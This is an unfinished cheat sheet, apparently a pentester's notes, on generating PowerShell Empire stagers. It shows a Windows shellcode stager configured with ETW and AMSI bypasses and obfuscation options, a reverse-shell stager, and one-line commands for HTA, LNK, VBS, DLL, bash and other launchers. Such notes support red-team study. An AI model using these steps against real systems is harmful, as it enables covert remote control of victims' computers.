# Core Commands

Search Tag(s): #command-and-control #empire

# 02 - Usage

### 2.3 - Generate Payloads

#### 2.3.1 - Windows

##### 2.3.1.1 - Shellcode

* UseStager

```
(Empire) > usestager windows/shellcode

 Author       @xorrior
              @monogas
 Description  Generate a windows shellcode stager
 Name         windows/shellcode


┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Architecture     │ both               │ True     │ Architecture of the .dll to         │
│                  │                    │          │ generate (x64 or x86).              │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher     │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ DotNetVersion    │ net40              │ True     │ Language of the stager to           │
│                  │                    │          │ generate(powershell, csharp).       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language         │ powershell         │ True     │ Language of the stager to generate. │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │                    │ True     │ Listener to generate stager for.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
│                  │                    │          │ powershell code, uses the           │
│                  │                    │          │ ObfuscateCommand for obfuscation    │
│                  │                    │          │ types. For powershell only.         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
│                  │                    │          │ use. Only used if Obfuscate switch  │
│                  │                    │          │ is True. For powershell only.       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ OutFile          │ launcher.bin       │ True     │ Filename that should be used for    │
│                  │                    │          │ the generated output.               │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
│                  │                    │          │ none, or other).                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
│                  │                    │          │ ([domain\]username:password) to use │
│                  │                    │          │ for request (default, none, or      │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerRetries    │ 0                  │ False    │ Times for the stager to retry       │
│                  │                    │          │ connecting.                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default            │ False    │ User-agent string to use for the    │
│                  │                    │          │ staging request (default, none, or  │
│                  │                    │          │ other).                             │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: usestager/windows/shellcode) > set Listener http_80
[*] Set Listener to http_80
(Empire: usestager/windows/shellcode) > execute
[+] launcher.bin written to /var/lib/powershell-empire/empire/client/generated-stagers/launcher.bin
```

* MSFVenom

```
(Empire) > usestager windows/reverseshell

(Empire: usestager/windows/reverseshell) > set Listener http_80
[*] Set Listener to http_80
```

##### 2.3.1.2 - Batch

`(Empire) > usestager windows/launcher_bat`

##### 2.3.1.3 - HTA

`(Empire) > usestager windows/launcher_hta`

##### 2.3.1.4 - EXE

TODO: Fill this info

* UseStager

CSharp payload

* MSFVenom

##### 2.3.1.5 - LNK

TODO: Fill this info

`(Empire) > usestager windows/launcher_lnk`

##### 2.3.1.6 - VBS

TODO: Fill this info

`(Empire) > usestager windows/launcher_vbs`

##### 2.3.1.7 - SCT

TODO: Fill this info

`(Empire) > usestager windows/launcher_sct`

##### 2.3.1.8 - WMIC

TODO: Fill this info

`(Empire) > usestager windows/wmic`

##### 2.3.1.9 - DLL

TODO: Fill this info

`(Empire) > usestager windows/dll`

##### 2.3.1.10 - XML

TODO: Fill this info

`(Empire) > usestager windows/launcher_xml`

#### 2.3.2 - OSX

##### 2.3.2.1 - Shellcode

TODO: Fill this info

`(Empire) > usestager osx/shellcode`

#### 2.3.3 - Multi

##### 2.3.3.1 - Bash

TODO: Fill this info

`(Empire) > usestager multi/bash`